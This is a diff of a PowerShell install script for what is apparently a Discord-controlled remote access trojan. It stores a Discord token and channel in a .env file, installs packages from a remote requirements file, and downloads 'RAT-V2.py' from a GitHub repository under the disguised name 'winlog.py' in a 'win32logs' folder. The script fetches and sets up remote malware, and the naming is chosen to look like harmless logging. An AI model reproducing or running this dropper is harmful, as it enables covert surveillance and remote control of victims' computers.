@@ -5,7 +5,7 @@ Set-Location win32logs
 New-Item -Path .env -Force
 Add-Content -Value ("DISCORD_TOKEN=$tk", "CHANNEL=$id") -Path .env
 
-python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org Pillow pyperclip discord.py[voice] requests pyautogui python-dotenv --user
+python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org -r https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/requirements.txt --user
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/RAT-V2.py -OutFile winlog.py
 
